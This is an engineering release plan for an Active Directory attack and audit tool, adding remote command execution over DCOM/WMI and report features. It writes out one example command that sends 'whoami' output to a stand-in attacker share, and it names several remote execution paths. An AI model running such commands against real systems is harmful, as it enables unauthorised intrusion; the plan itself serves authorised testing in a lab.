# adhammer 1.4.6 — HARD PLAN ("the 10/10 ecosystem release")

**Status:** authoritative execution plan for the release after 1.4.5.
**Version target:** `v1.4.6` — additive, ZERO CLI breaks (patch line, per project convention).
**Thesis:** 1.4.5 scaffolds `ms-dcom` + `ms-wmi` but holds them unpublished (empty scaffolds burn
the crate name). **1.4.6 FILLS them** so the Rust ecosystem finally gets **cross-platform DCOM/WMI
from Linux with no Windows COM runtime** — the single biggest Rust-Windows-admin gap
(`IWbemServices::ExecMethod('Win32_Process.Create')` from Kali is a splash release; no other crate
can do it today). Plus the four report/UX promises: **light/dark report theme**, **impact proof on
ALL 70 checks**, **wire-transcript proof on ALL 58 (soon 70+) checks + every future check** (enforced
by a CI gate — no more "our word" for any finding, ever), and **BloodHound-style interactive graph
inline in the HTML report** (principals + privileges + labeled edges, no CDN).

**Why this ordering (from the 5-lib ecosystem rating):** ms-dcom = 10/10 potential but 4/10 as a
scaffold; ms-wmi rides on it (9/10). Filling them is "one of the top-3 Rust-Windows milestones of
the year." ms-scmr/ccache-io/ms-bkrp already shipped real in 1.4.5 — this cycle is the two big ones.

---

## 0. Preconditions (all true before 1.4.6 work starts)

1. 1.4.5 live on crates.io + tag `v1.4.5` (dcerpc 0.2.8 sealer, ms-scmr full, ccache-io, ms-bkrp).
   `ms-dcom 0.1.0` + `ms-wmi 0.1.0` scaffolds exist locally but are **NOT published** — 1.4.6 fills
   then publishes them as **0.2.0** (scaffold→real is additive within 0.x, but the pub surface jump
   is large → bump the minor, not a patch).
2. **WS-4-P2 sealed Kerberos RPC bind is DONE** (DCOM activation needs a signed/sealed bind on
   hardened DCs). If it slipped in 1.4.5 it is the FIRST item here — everything DCOM depends on it.
3. Disk ≥ 25 GB free; every touched repo committed & clean at session start.
4. Lab: testlab.local 2019/2022/2025 + at least one **domain member** with WMI reachable
   (DCOM RCE is a member-server story, not just DC). Creds in `Desktop\CYBERSEC.md`, never committed.

---

## 1. RULES OF ENGAGEMENT (non-negotiable — violating any = stop)

- **NO AI features, ever.** No LLM/API/MCP/ML dep. Narrative stays rule-based/deterministic.
- **No competitor names** in shipped code/docs/README/Cargo descriptions (allowed only in
  `docs/BENCHMARKS.md`, `bench/*`, genuine interop labels). Describe what WE do.
- **On-prem only.** Entra/hybrid/AD FS/Azure permanent exclusions.
- **Real proof, never our word.** Every attack/enum ships with a live capture in `docs/VALIDATION.md`
  before "done." No blind wire code — un-validatable ⇒ defer, don't half-ship.
- **Dual-use gate** for new sibling crates (ms-dcom / ms-wmi both pass — admin/DFIR/monitoring want
  DCOM+WMI too, so they're legitimately standalone, not attacker-only compositions).
- **Consumer-safety gate (HARD, per-crate):** `fmt → clippy -D → test → FUZZ (0 panics) →
  semver-checks → bounded-alloc audit → --dry-run → publish → verify index`. Every wire parser in
  ms-dcom/ms-wmi (OXID blobs, ORPC, VARIANT/SAFEARRAY/CIM object) gets a fuzz target — these parse
  attacker/server bytes, so they are not publish-ready without a clean fuzz run (on WSL Kali; the
  Windows libFuzzer DLL gap is closed there).
- **`#[non_exhaustive]` on every public error enum** in ms-dcom / ms-wmi at 0.2.0.
- **Bounded-alloc preflight** on every wire-derived length (SAFEARRAY bounds, BSTR lengths, CIM
  property counts) — attacker-controlled, must reject `u32::MAX` in <50ms.
- **Never break interactive/auto.** Every new verb (`attack exec --method wmi`, `enum wmi`) ships
  with an interactive menu entry in the same commit.
- **Publish is irreversible + the user's explicit call.** Bottom-up, `--dry-run` first, tag after.
  `git add <files>` (never `-A`); `git -c commit.gpgsign=false`; never `Co-Authored-By: Claude`.
  **Do not push or publish anything until the user says so explicitly.**
- **★ 1.4.6 = ALL LOCAL (user directive 2026-08-26).** Every commit, every crate bump, every
  workspace change lives on-disk only for the whole cycle: `git commit` fine, `git push` NEVER
  without an explicit "push" order, `cargo publish` NEVER without an explicit "publish" order for
  the specific crate. Rationale: 1.4.6 fills the two headline libs (ms-dcom + ms-wmi) that will
  drive real ecosystem adoption — an accidental early publish burns the crate name at the exact
  moment maximum polish matters. Hold the batch until the whole 1.4.6 story is coherent, then
  ship together on the user's word. Applies to the `.agents/` plan iterations too (already
  gitignored equivalent — kept local until user says push).

---

## 2. Workstreams

> Each WS: **Goal · Files · Effort (S ≤1d / M 2–3d / L 4–6d) · Depends · Acceptance · Verify · Rollback.**

### Tier 1 — FILL the 10/10 libs (ms-dcom + ms-wmi) and wire them into the tool ★ the headline

**WS-D1 — `ms-dcom` fill: real DCOM base (0.1.0 scaffold → 0.2.0)**
- Goal: a working cross-platform DCOM client — no Windows COM runtime, drives from Linux.
  Concretely: `IObjectExporter` (OXID/ping resolver over the EPM/135 + the OXID resolver port),
  `ISystemActivator` / `IRemoteSCMActivator::RemoteCreateInstance` (activate a class → interface
  pointer), `IRemUnknown2::RemQueryInterface` / `RemRelease` (ref-count lifecycle so the server
  doesn't leak/reject), and the ORPC framing (`ORPCTHIS` / `ORPCTHAT`, causality id, version).
- Files: `ms-dcom` sibling crate (extend the scaffold). Reuses `dcerpc` auth binds (incl. WS-4-P2
  sealed) + `ms-ndr`. New public error enum `DcomError` (`#[non_exhaustive]`).
- Effort: **L** (this is the deep one). Depends: dcerpc 0.2.8 sealed bind (Precond 2).
- Acceptance: activate a well-known class (e.g. `IWbemLevel1Login` CLSID) on the lab member and get
  back a usable interface pointer + OXID binding; `RemRelease` cleans up with no server-side leak.
- Verify: live on 2022 member; NDR byte fixtures for the activation-property blob + OXID resolver
  response; fuzz the OXID/ORPC parsers. Rollback: new crate, no downstream impact if unshipped.
- **HARD SCOPE GUARDRAILS (rabbit-hole ceiling):** activation + IRemUnknown lifecycle + ORPC only.
  NO async/notification sinks, NO ITypeInfo, NO general MS-OAUT. Kill-criterion: if ms-dcom crosses
  ~2500 LOC or 5 focused sessions before a live activation round-trips, freeze the surface and push
  the remainder to 1.4.7 — ship what activates.

**WS-D2 — `ms-wmi` fill: `IWbemServices` (0.1.0 scaffold → 0.2.0) ★ the splash**
- Goal: `IWbemLevel1Login::NTLMLogin('root\cimv2')` → `IWbemServices`, then:
  (a) **`ExecMethod`** — `Win32_Process.Create('cmd /c …')` returns a PID (this is wmiexec/dcomexec
  RCE from Linux); (b) **`ExecQuery`** (WQL, semi-sync `IEnumWbemClassObject::Next`) for read-only
  inventory. Requires the WMI marshaling layer: BSTR, VARIANT (LONG/BSTR/BOOL/ARRAY), SAFEARRAY, and
  the **MS-WMIO CIM object encoding** (class/instance blocks, property qualifiers) — the hard part.
- Files: `ms-wmi` sibling crate (extend scaffold) over `ms-dcom`. `WmiError` (`#[non_exhaustive]`).
  Marshaling in a `ms-wmi::marshal` module (BSTR/VARIANT/SAFEARRAY/CIM), fuzz-targeted.
- Effort: **L**. Depends: **WS-D1**.
- Acceptance: `Win32_Process.Create('cmd /c whoami > \\attacker\share\o.txt')` returns ProcessId +
  ReturnValue 0 on the lab member; `SELECT Name FROM Win32_Service` enumerates real services.
- Verify: live on 2022 member (positive) + a hardened member (clean access-denied). CIM-object
  round-trip byte fixtures; fuzz the CIM/VARIANT/SAFEARRAY parsers (0 panics). Rollback: new crate.
- **HARD SCOPE GUARDRAILS:** `root\cimv2` namespace only; `Win32_Process.Create` +
  `SELECT … FROM Win32_{Process,Service,Product,Share,OperatingSystem}` only. NO Put/Delete class,
  NO event subscriptions, NO async sinks, NO custom namespaces. NDR alias set only for the shapes
  these calls need. Kill-criterion mirrors WS-D1 — ship ExecMethod even if ExecQuery slips.

**WS-D3 — adhammer integration: `attack exec --method wmi` + `enum wmi`**
- Goal: surface the two libs in the tool. `attack exec --method wmi --command '…'` (Win32_Process
  RCE, output read-back via a temp share, mirrors the 1.4.5 `--method smb`/scmr path); `enum wmi`
  (service/process/patch/share/OS inventory via WQL) as an evidence-backed enum. Interactive menu
  entries for both (per the never-break-interactive rule).
- Files: `cli/src/attacks/exec.rs` (add the `wmi` arm), `cli/src/enums/wmi.rs` (new),
  `cli/src/interactive.rs` (menu + dispatch), `AttackCmd`/`EnumCmd` wiring.
- Effort: **M**. Depends: WS-D1 + WS-D2.
- Acceptance: `attack exec --method wmi` returns `nt authority\system`-context output from the lab
  member; `enum wmi` returns a real service list; both appear in the interactive menu.
- Verify: live on member; capture for `docs/VALIDATION.md`. Rollback: feature-gate the wmi arm.

**WS-D4 — publish wave (the user's explicit go, irreversible, bottom-up)**
- ms-dcom 0.2.0 → ms-wmi 0.2.0 (bottom-up, dry-run each, fuzz-clean first) → then the adhammer
  workspace bump consuming them → tag. Per-crate consumer-safety gate. Announce: "DCOM+WMI from
  Linux, no Windows runtime" — this is the marketing beat, ground it in the live `Win32_Process.Create` capture.

### Tier 2 — report + proof UX (the user's two explicit asks) ★ ship even if Tier 1 slips

**WS-THEME — light/dark report theme** — ✅ **DONE 2026-08-26** (commit `5959bc0`, LOCAL only per 1.4.6-all-local rule; 195 tests pass, clippy clean, `html_carries_light_and_dark_theme_layers` gate test added; two hardcoded hex values promoted to `--code-bg` + `--hop-bg` tokens; toggle button + inline JS + `localStorage['adhammer-theme']` persistence)
- Goal: the HTML report currently commits to dark only (`:root{color-scheme:dark; --bg:#0b1020; …}`
  in `crates/report/src/lib.rs::to_html`). Make it **theme-aware**: a complete **light** palette on
  bare `:root`, the existing dark palette moved under `@media (prefers-color-scheme: dark)` **and**
  a `[data-theme="dark"]` selector, plus a small **toggle button** (☀/🌙) in the hero that flips
  `data-theme` and remembers the choice in `localStorage`. Default = follow the OS (`prefers-color-scheme`).
- Files: `crates/report/src/lib.rs` — restructure the `<style>` block into token layers
  (`:root` light → `@media (prefers-color-scheme: dark)` + `:root[data-theme="dark"]` → optional
  `:root[data-theme="light"]` override); add ~15 lines of inline JS for the toggle + localStorage
  (no external dep — self-contained, matches the "no CDN" report rule). SVG graph + coverage table
  + chips all read the tokens, so they re-theme for free. **Every color must have a bare-`:root`
  definition** (never only inside a media block) so the light default paints correctly.
- Effort: **S–M**. Depends: none — pure report-crate CSS/JS.
- Acceptance: open the report → it follows OS theme; the toggle flips light↔dark and survives a
  reload; both themes are legible (contrast ≥ WCAG AA on text); the SVG graph edges/nodes and the
  coverage matrix read correctly in both. Rollback: single report-crate commit, revertable; JSON/MD/txt unaffected.
- Test: `cargo test -p adhammer-report` (add a test asserting both `prefers-color-scheme: dark` and
  a bare-`:root --bg` are present in `to_html()` output); eyeball a live report in both themes.

**WS-PROOF-70 — impact proof on ALL 70 checks, in the report AND the CLI output**
- Goal: today WS-PROOF puts `Evidence` on the findings that *fire*, and the report shows it; but
  (a) not every check is guaranteed to emit evidence, and (b) the **CLI/auto text output** shows
  proof only in the guided PoC path, not under every tripped finding in a plain `scan`. 1.4.6 makes
  the promise total: **every one of the 70 checks (post-1.4.5 coverage) carries an impact line +
  ground-truth evidence, rendered in the report AND printed in the CLI/auto output.**
- Three parts:
  1. **Audit + fill evidence coverage** — a test that walks `registry()` and asserts every check,
     when fired against a crafted-positive fixture snapshot, returns ≥1 `Evidence` AND a non-empty
     `impact`. Fill any check missing either (the 1.4.5 58→70 coverage additions especially).
     Files: `crates/checks` (fill gaps), `crates/checks/tests/evidence_complete.rs` (new gate test).
  2. **CLI proof lines** — `scan --format txt` and the `auto`/guided summary print, under each
     tripped finding, a capped `proof:` line (the first Evidence `source = value`) and an `impact:`
     line — not just in the HTML. Cap length (≤160 chars / ≤2 lines) so it stays readable; `--json`
     stays machine-clean. Files: `crates/report/src/lib.rs` (`to_text_summary` — add proof/impact
     under each top finding), `cli/src/guided.rs` (per-finding proof already partly there — extend
     to every tripped finding, not only validated ones).
  3. **Coverage matrix carries proof state** — the WS-R2 coverage matrix (report + CLI) marks each
     tripped check with a ✓proof indicator and each clean check as "checked, clean"; a check that
     somehow lacks evidence is a visible gap, caught by the part-1 gate test before ship.
- Effort: **M**. Depends: WS-COVERAGE 58→70 landing (1.4.5 Tier-3) — proof-complete is measured
  against the 70, so if coverage is still 58 at 1.4.6 start, the gate runs on 58 and the target
  count updates when the SYSVOL/probe classes land.
- Acceptance: `adhammer scan --format txt` shows `proof:` + `impact:` under every tripped finding;
  the HTML shows Evidence for all; the coverage matrix shows proof/clean per check; the new
  `evidence_complete` test is green (0 checks without evidence+impact). Rollback: text-emitter and
  test only; revertable without touching the check logic.

**WS-WPT — wire-proof transcripts for ALL 58 (soon 70+) checks + every future check**
- Goal: today `Evidence { source, value }` captures the *interpreted* proof (LDAP attr = 0x4). What
  the operator/client actually wants to see in the report is **the wire exchange itself, on every
  finding**: "adhammer sent request X, DC replied Y, that reply means vuln because Z." A packet-
  capture snippet inline, per finding — attack chains become auditable without breaking out Wireshark.
  **Not a hand-picked 5 probes: every one of the 58 (soon 70+) checks + every new check going
  forward.** Enforced by a gate test.
- **Architecture — shared collector-instrumentation, not per-check bespoke work.**
  1. `crates/core/src/finding.rs` — new
     `pub struct WireExchange { layer: WireLayer, direction: Sent|Recv, opnum: Option<u16>, summary: String, raw_hex: Option<String> }`
     + `Finding.exchange: Vec<WireExchange>` (serde-skip empty; additive → patch on 0.x).
     `WireLayer`: `Ldap | Rrp | Smb | Kerberos | Rpc | Http`.
  2. **`crates/collector` instruments every LDAP search once** — each `Collector::search_*` returns
     entries AND records a `SearchOp { base_dn, filter, attrs, returned_count }` in the `Snapshot`.
     `Snapshot` gains a lightweight **attribute-provenance index**: `HashMap<(DN_lower, attr), SearchOpId>`
     populated at collection time. Cost: ~50 LOC in collector + Snapshot; **50 LDAP-passive checks
     get wire proof for free** — each `Evidence` also carries the `SearchOp` that produced its
     `source` attribute.
  3. **Ergonomic helper** — a shared `snap.evidence_wire(dn, attr) -> (Evidence, Vec<WireExchange>)`
     used by every check; a `Finding::with_evidence_wire(...)` builder attaches both in one call.
     Turns per-check work from "hand-craft an exchange" into `f.with_evidence_wire(snap, dn, attr)`.
  4. **Active-probe checks** (~5–8: ESC-registry via RRP, ESC8 HTTP CertSrv, posture LDAP-signing/CBT,
     Zerologon detect via ms-nrpc, Kerberoast/AS-REP etype negotiation, SYSVOL SMB reads) — each
     records its own exchange at the probe site. These are the only sites needing bespoke instrumentation.
  5. **Renderers** — expandable `<details>` block per finding in HTML ("Show wire exchange"),
     collapsible section in MD, one-line `wire: LDAP search (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) → 3 entries` in txt, full `exchange[]` array in JSON for machine-readable audit trails.
  6. **Gate test — "no finding without wire proof"**: `crates/checks/tests/wire_proof_complete.rs`
     walks `registry()`, fires each check against a crafted-positive fixture snapshot, asserts every
     resulting `Finding` has `!f.exchange.is_empty()`. **New checks that skip WPT fail the test →
     CI blocks the PR.** This is what "every future check" means in enforceable terms.
- Effort: **XL** — decomposed:
  - **Session 1 (M):** finding-model + collector `SearchOp` capture + Snapshot provenance index + shared helper. Gate test skeleton (allowlist for legacy checks initially).
  - **Session 2 (M):** report renderers (HTML/MD/txt/JSON) + WS-THEME token integration + txt cap (≤160 char/2 lines per WireExchange).
  - **Session 3 (M):** mechanical wire-up of all 50 LDAP-passive checks — one `.with_evidence_wire(...)` per check. Enable gate test for the LDAP tier.
  - **Session 4 (M):** bespoke instrumentation of the 5–8 active probes (RRP/HTTP/KRB/NRPC/SYSVOL). Enable gate test for the full 58 → **acceptance met.**
  - **Cap `raw_hex` at 512 B per exchange** (bounded-alloc; hostile server can't balloon the report).
- Depends: WS-PROOF-70 gate (they compose — WPT extends the proof-complete gate with an `!exchange.is_empty()` clause). Both land in 1.4.6.
- Acceptance:
  1. Every finding in every 1.4.6 scan carries ≥1 `WireExchange`, rendered in HTML/MD/txt/JSON.
  2. `wire_proof_complete` gate test is green (0 checks without exchange).
  3. New checks added after 1.4.6 that omit `.with_evidence_wire(...)` **fail CI** — the "for every future check" promise is enforced by code, not discipline.
  4. HTML shows, e.g. for ESC1: `Wire exchange: LDAP search base=CN=Configuration,... filter=(objectClass=pKICertificateTemplate) attrs=[msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage, nTSecurityDescriptor] → 14 entries, target template's nTSecurityDescriptor = <32-byte SD, DACL grants CONTROL_ACCESS to S-1-5-11 Authenticated Users>` with a `→ interpretation: broad principal holds enrollment right = ESC1 precondition.`
- Rollback: additive; `exchange` empty on any legacy check that hasn't been wired = report renders as today; gate test allowlist can carry legacy IDs until session 3 lands.
- **Non-goal:** full pcap dump. This is *targeted* wire evidence per finding — the search that produced it or the round-trip that confirmed it. Not `tcpdump`.

**WS-BHG — BloodHound-style interactive graph in the report (principals + privileges + edges)**
- Goal: extend WS-R1 (cheapest-N-attack-paths static SVG) into a **full principal/group/computer
  graph** — nodes labeled with sAMAccountName + privilege badges (`DA`, `EA`, `SA`, `KerbAdmin`,
  `LAPS-r`, `Unconstrained`); edges labeled with the relationship (`memberOf`, `WriteDacl`,
  `GenericAll`, `WriteProperty→msDS-KeyCredentialLink`, `DCSync`); pan/zoom + click-node-for-detail
  panel. Same information the operator normally opens BH-CE to see, without leaving the report.
- Files: `crates/report/src/graph_bh.rs` (new — full-graph SVG emitter, deterministic layout so two
  scans of the same domain diff cleanly), `crates/report/src/lib.rs` (embed in `to_html()` as a new
  panel after the attack-paths block). **Interaction layer:** ~600–1000 LOC of vanilla JS inlined
  in the report — pan (mouse drag), zoom (wheel), click-to-highlight-neighbors, a small side panel
  showing node metadata (dn, sids, memberOf chain, direct/indirect paths). **No CDN, no d3** — the
  project rule holds; hand-roll the SVG + JS (ripgrep-dep-tree discipline).
- **Scope guardrails (rabbit-hole prevention):**
  1. **Top-N principals only** by default (config `--graph-max-nodes 250`, hard cap 1000). A 50k-user
     enterprise directory rendered fully = a 200 MB HTML file no one opens. Prune to nodes on a
     Tier-0 path OR flagged by ≥1 finding OR direct member of a Tier-0 group.
  2. **Static layout, force-directed offline** — compute node positions in Rust at scan time (spring
     model, 200 iterations, seeded), emit as static SVG coordinates. Runtime JS only handles
     interaction (pan/zoom/highlight), not layout. Byte-stable diffs.
  3. **Interaction is progressive-enhancement** — the SVG renders + is readable with JS off.
- Effort: **L** (~3–4 focused sessions: graph model + prune + layout + SVG emit + JS interaction).
- Depends: none — reads the existing `Snapshot` + `ControlGraph`. Ships even if Tier 1 slips.
- Acceptance: HTML report has a "Domain graph" panel with pan/zoom; each node shows a name +
  privilege badges; hovering an edge shows the ACL right / relationship; clicking a Tier-0 node
  highlights every principal with a path to it; the graph is legible in both light and dark themes
  (WS-THEME token-driven). Rollback: gated behind `--graph=on|off|paths-only` (default `on`);
  `off` reverts to the current WS-R1 paths-only view.
- **Explicit non-goal:** BloodHound *replacement*. Real BH-CE is still the queryable analyst tool;
  this is the **inline-in-the-report** view for a client-facing deliverable, so the exec/tech lead
  reading the PDF doesn't have to open BH.

### Tier 3 — polish (only if Tier 1 wraps early)

- **WS-WMI-WIDE** — more `Win32_*` WQL classes for `enum wmi` (logical disks, local admins via
  `Win32_GroupUser`, scheduled tasks) — additive, offline-fixture-testable per class.
- **WS-DCOMEXEC** — `attack exec --method dcom` via `MMC20.Application` / `ShellWindows` DCOM object
  method invocation (a second RCE path that doesn't touch WMI), if ms-dcom's method-call surface is
  general enough after WS-D1.
- **WS-THEME-CLI** — honor `NO_COLOR` / a `--no-color` flag consistently across the CLI (pairs with
  the report theme work for a coherent light/dark story end-to-end).

---

## 3. Dependency ordering (respect the DAG)

```
WS-4-P2 sealed bind (from 1.4.5; precond) ─► WS-D1 (ms-dcom activation on hardened DCs)
WS-D1 (ms-dcom) ─► WS-D2 (ms-wmi IWbemServices) ─► WS-D3 (attack exec --method wmi / enum wmi)
WS-D1+D2 fuzz-clean + live-validated ─► WS-D4 publish (ms-dcom 0.2.0 → ms-wmi 0.2.0 → adhammer)
(independent, offline, ship even if Tier 1 slips) WS-THEME · WS-PROOF-70 · WS-WPT · WS-BHG
WS-COVERAGE 58→70 (1.4.5 Tier-3) ─► WS-PROOF-70 measures completeness against the 70
WS-PROOF-70 (finding-level Evidence) ─► WS-WPT (wire-level exchange under the same Finding)
WS-R1 (existing paths-only SVG, 1.4.4) ─► WS-BHG (full principal graph + interaction, same crate)
```

---

## 4. Committed vs stretch vs deferred

**1.4.6 COMMITTED:** WS-D1 · WS-D2 (at least `Win32_Process.Create`) · WS-D3 · WS-D4 publish ·
**WS-THEME · WS-PROOF-70 · WS-WPT (model + 3 probe families) · WS-BHG (base graph + interaction)**
(the four report asks — independent of DCOM, land regardless of Tier-1 progress).
**Stretch (only if DCOM wraps early):** WS-D2 `ExecQuery` full · WS-WMI-WIDE · WS-DCOMEXEC.
**Deferred to 1.4.7 if the DCOM rabbit hole bites:** full IWbem surface (Put/Delete/events), custom
namespaces, `ms-dcom` general method-call framework — ship `Win32_Process.Create` + the report UX,
defer the rest. **The two report asks are NOT deferrable** — they're small and independent.

## 5. Risk register

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| DCOM/WMI marshaling (CIM/VARIANT/SAFEARRAY) is a multi-week rabbit hole | High | High | Hard scope guardrails + kill-criteria on WS-D1/D2; ship `Win32_Process.Create` only; defer rest |
| WS-4-P2 sealed bind not done → DCOM activation fails on hardened DCs | Med | High | Do WS-4-P2 first (precond); test DCOM against a non-CBT member as fallback positive |
| Publishing filled ms-dcom/ms-wmi with a latent parse panic | Med | High (crashes consumers) | Fuzz gate mandatory before publish (WSL Kali); bounded-alloc audit on every wire length |
| Light theme regresses dark legibility | Low | Med | Token-layer discipline (every color on bare `:root`); AA-contrast check both themes; report-crate test |
| "70 checks" proof gate blocks ship because coverage is still 58 | Low | Low | Gate measures against whatever `registry()` returns; target label updates when 70 lands |

## 6. Definition of done (all must hold to tag v1.4.6)

- [ ] `attack exec --method wmi` returns live RCE output from the lab member, captured in VALIDATION.md.
- [ ] ms-dcom 0.2.0 + ms-wmi 0.2.0 fuzz-clean (0 panics), semver-checked, published bottom-up.
- [ ] Report renders correctly in **light and dark**, OS-follow + working toggle, both AA-legible.
- [ ] Every check in `registry()` returns evidence + impact (the `evidence_complete` gate is green);
      `scan --format txt` and `auto` print `proof:`+`impact:` under every tripped finding.
- [ ] `cargo fmt --all --check` clean; `clippy --workspace --all-targets -D warnings` clean;
      `cargo test --workspace` green; MSRV re-verified.
- [ ] `CHANGELOG.md ## [1.4.6]` from `git log v1.4.5..HEAD`; README "What's new in 1.4.6".
- [ ] No AI dep, no competitor name, no CLI break, no un-yank of yanked crates.
- [ ] 1.4.7 plan scaffolded from what got cut.

---

## 7. Ecosystem 10/10 scorecard — the 5 new libs (verified against on-disk LOC 2026-08-26)

Two axes: **ecosystem score** (how much the Rust world needs it) and **as-shipped** (what's actually
built today). Effort only moves the score for the wide-audience libs; the niche ones are **audience-
capped** — you cannot code your way to 10/10 when the audience is small. Be honest about which is which.

| Lib | On-disk | Ecosystem ceiling | As-shipped | Cap type | Path to its ceiling |
|---|---|---|---|---|---|
| **ms-dcom** | 130 LOC scaffold | **10/10** | 4/10 | **effort** — fill it | **WS-D1** (OXID + RemoteCreateInstance + IRemUnknown + ORPC). THE biggest Rust-Windows gap. |
| **ms-wmi** | 107 LOC scaffold | **9/10** | 4/10 | **effort** — fill it | **WS-D2** (IWbemServices ExecMethod + WQL + CIM marshaling). Rides on ms-dcom. |
| **ms-scmr** | 371 LOC, ~7 pub | **9/10** | ~7/10 | **effort** — finish it | 1.4.5 **WS-P1** (full opnums 12/15/2/16/13 + `attack exec --method smb` + fuzz + live). Universal audience (every service-mgmt tool). |
| **ccache-io** | 643 LOC, ~11 pub | **8/10** ⚠️ | ~7/10 | **AUDIENCE** — narrow | Finish MIT ccache v4 + `.kirbi` + FILE:/API: variants + fuzz + interop test. **Ecosystem stays ~8 no matter what** — Kerberos-ticket interop is universal *within* a niche. |
| **ms-bkrp** | 492 LOC, 0.1.1, ~7 pub | **6/10** ⚠️ | ~9/10 (done) | **AUDIENCE** — niche | Essentially DONE (live-proven on 2025). DPAPI-recovery + post-DA only. **Do NOT pour 10/10 effort here — the gap isn't wide, it's already filled correctly for what it is.** |

### ⚠️ You asked "if a lib's ecosystem importance is not >8, say me" — here they are:
- **ccache-io = 8** (exactly at, not above) — audience-capped. Worth shipping (zero competitor, real hole), but don't expect downloads gravity beyond the Kerberos-tooling niche.
- **ms-bkrp = 6** — audience-capped and **already essentially complete**. Ship it as-is; investing more is wasted effort per user, few users.

### What that means for priorities (hard-critic)
- **Spend 10/10 effort ONLY on ms-dcom + ms-wmi** (WS-D1/D2 above) — those are the two where filling the code actually moves the ecosystem needle to "top-3 Rust-Windows milestone of the year." That's already this plan's Tier 1.
- **Finish ms-scmr in 1.4.5** (WS-P1) — 9/10 wide audience, ~7/10 built, small gap to close.
- **Ship ccache-io + ms-bkrp as the "real 3" now** (with ms-scmr) — real code, zero competitors — but rate them honestly in the announcement: useful, not headline. The **headline is DCOM/WMI from Linux**, nothing else.
- **Do NOT** publish ms-dcom/ms-wmi at 0.1.0 scaffold — empty crates burn the name (your own call, correct). Publish them at **0.2.0 only after WS-D1/D2 fill them**.
